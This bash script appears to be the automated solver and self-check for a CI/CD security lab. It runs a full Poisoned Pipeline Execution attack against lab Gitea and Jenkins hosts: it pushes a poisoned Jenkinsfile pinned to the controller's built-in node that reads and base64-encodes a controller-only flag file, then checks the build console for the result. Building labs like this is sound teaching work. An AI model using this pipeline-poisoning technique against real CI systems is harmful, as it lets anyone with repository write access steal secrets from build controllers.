#!/bin/bash
# cc-solve: the lab's automated Direct-PPE / PBAC-escape solver and self-check (CICD-SEC-4 + -5).
#
# Run by Isoloom as an in-machine `exec` check from the Jenkins controller (which can reach Gitea at
# gitea:3000 and Jenkins at 127.0.0.1:8080, and has git + curl). It walks the intended attack
# end-to-end and asserts it still works, so a learner whose box broke is told to reset it:
#
#   1. clone Wonderland/cheshire-cat with the attacker's WRITE credentials (alice)
#   2. create a branch and POISON the Jenkinsfile: pin the pipeline to the controller's Built-In Node
#      (agent { label 'built-in' }) and `cat ~/flag5.txt | rev | base64` to exfiltrate the
#      controller-only file (rev keeps the exfil robust, as in the White Rabbit lab)
#   3. push the branch and open a pull request (the SCM-poll trigger then builds it)
#   4. read the branch build's console output and assert the exfiltrated (reversed+base64) flag is there
#
# Exit 0 = solvable. It proves the per-player flag was exfiltrated from the controller filesystem via
# a pipeline that escaped onto the controller, but NEVER prints the flag (that is what the player
# submits).
set -u

GITEA_HOST="gitea:3000"
GITEA="http://${GITEA_HOST}"
JENKINS="${CC_JENKINS_URL:-http://127.0.0.1:8080}"
ORG="Wonderland"
REPO="cheshire-cat"
JOB="wonderland-cheshire-cat"

ATTACKER="alice:alice"          # the attacker: WRITE access to the repo
JAUTH="admin:admin"             # a Jenkins user who can read the build console
FLAG_FILE="${CC_FLAG_FILE:-${HOME:-/root}/flag5.txt}"
DEADLINE=$(( $(date +%s) + ${CC_DEADLINE:-300} ))

log()  { echo "cc-solve: $1" >&2; }
fail() { echo "FAIL: $1" >&2; exit 1; }
left() { [ "$(date +%s)" -lt "$DEADLINE" ]; }

# --- the expected exfiltration, computed from the controller-only flag file -----------------------
# Read from the same root-only file the pipeline will cat; never printed. The pipeline runs
# `cat ~/flag5.txt | rev | base64`, i.e. base64 of reverse(<flag>); reproduce exactly that and search
# the console for it. (The flag file carries no trailing newline, so `printf '%s'` matches `cat`.)
[ -r "$FLAG_FILE" ] || fail "flag file $FLAG_FILE is missing or not readable"
FLAG="$(cat "$FLAG_FILE")"
[ -n "$FLAG" ] || fail "the staged flag is empty"
EXPECTED="$(printf '%s' "$FLAG" | rev | base64 | tr -d '\n')"
[ -n "$EXPECTED" ] || fail "could not compute the expected exfiltration"

jget() { curl -s -m 10 -u "$JAUTH" "$@"; }
jcode() { curl -s -m 10 -o /dev/null -w '%{http_code}' -u "$JAUTH" "$1"; }

# --- 1. wait for Gitea's repo and the Jenkins job to be ready -------------------------------------
log "waiting for the cheshire-cat repository on Gitea..."
until curl -s -m 10 -o /dev/null -w '%{http_code}' -u "$ATTACKER" \
        "$GITEA/api/v1/repos/$ORG/$REPO/branches/main" 2>/dev/null | grep -q '^200$'; do
  left || fail "the Gitea repository never became ready"; sleep 3
done

log "waiting for the Jenkins pipeline job to exist..."
until [ "$(jcode "$JENKINS/job/$JOB/api/json")" = "200" ]; do
  left || fail "the Jenkins job never appeared"; sleep 3
done

# --- 2. clone, branch, poison the Jenkinsfile (pin the controller's Built-In Node) ----------------
WORK="$(mktemp -d)"; trap 'rm -rf "$WORK"' EXIT
BR="ppe-$(date +%s)-$$"
export GIT_TERMINAL_PROMPT=0 GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_SYSTEM=/dev/null
export GIT_AUTHOR_NAME="alice" GIT_AUTHOR_EMAIL="alice@wonderland.example"
export GIT_COMMITTER_NAME="alice" GIT_COMMITTER_EMAIL="alice@wonderland.example"
REMOTE="http://$ATTACKER@$GITEA_HOST/$ORG/$REPO.git"

git clone -q "$REMOTE" "$WORK/repo" || fail "could not clone the repository (attacker write creds)"
cd "$WORK/repo" || fail "clone directory missing"
git checkout -q -b "$BR"

cat > Jenkinsfile <<'POISON'
pipeline {
    agent { label 'built-in' }
    stages {
        stage('Install_Requirements') {
            steps {
                sh 'cat ~/flag5.txt | rev | base64'
            }
        }
    }
    post {
        always {
            cleanWs()
        }
    }
}
POISON

git add Jenkinsfile
git commit -q -m "ci: run the install step on the built-in node"
git push -q "$REMOTE" "$BR" || fail "could not push the poisoned branch"
log "pushed poisoned branch $BR"

# --- 3. open a pull request (faithful to the upstream challenge; the branch build triggers anyway) -
curl -s -m 10 -o /dev/null -u "$ATTACKER" -X POST -H 'Content-Type: application/json' \
  -d "{\"head\":\"$BR\",\"base\":\"main\",\"title\":\"Run install on the built-in node\"}" \
  "$GITEA/api/v1/repos/$ORG/$REPO/pulls" 2>/dev/null || true

# --- 4. nudge an immediate repository scan (best effort; the 1-minute poll covers it otherwise) ----
scan() {
  local cj cr
  cj="$(mktemp)"
  cr="$(curl -s -m 10 -c "$cj" -u "$JAUTH" \
        "$JENKINS/crumbIssuer/api/xml?xpath=concat(//crumbRequestField,%22%3A%22,//crumb)" 2>/dev/null)"
  [ -n "$cr" ] && curl -s -m 10 -o /dev/null -b "$cj" -u "$JAUTH" -H "$cr" \
        -X POST "$JENKINS/job/$JOB/build" 2>/dev/null
  rm -f "$cj"
}
scan

# --- 5. poll the branch build's console for the exfiltrated flag ----------------------------------
BRANCH_JOB="$JENKINS/job/$JOB/job/$BR"
log "waiting for the pipeline to run branch $BR on the controller and exfiltrate the flag..."
nudged=0
while left; do
  console="$(jget "$BRANCH_JOB/lastBuild/consoleText" 2>/dev/null)"
  if printf '%s' "$console" | grep -qF -- "$EXPECTED"; then
    log "OK: flag5 (${#FLAG} chars) was read from the controller filesystem by a pipeline pinned to"
    log "    the Built-In Node — the reversed+base64 blob is in build ${BR}'s console (flag not shown)."
    exit 0
  fi
  nudged=$((nudged+1))
  [ $(( nudged % 6 )) -eq 0 ] && scan   # re-nudge the scan roughly every 30s
  sleep 5
done

fail "the flag did not appear in the pipeline console before the deadline"
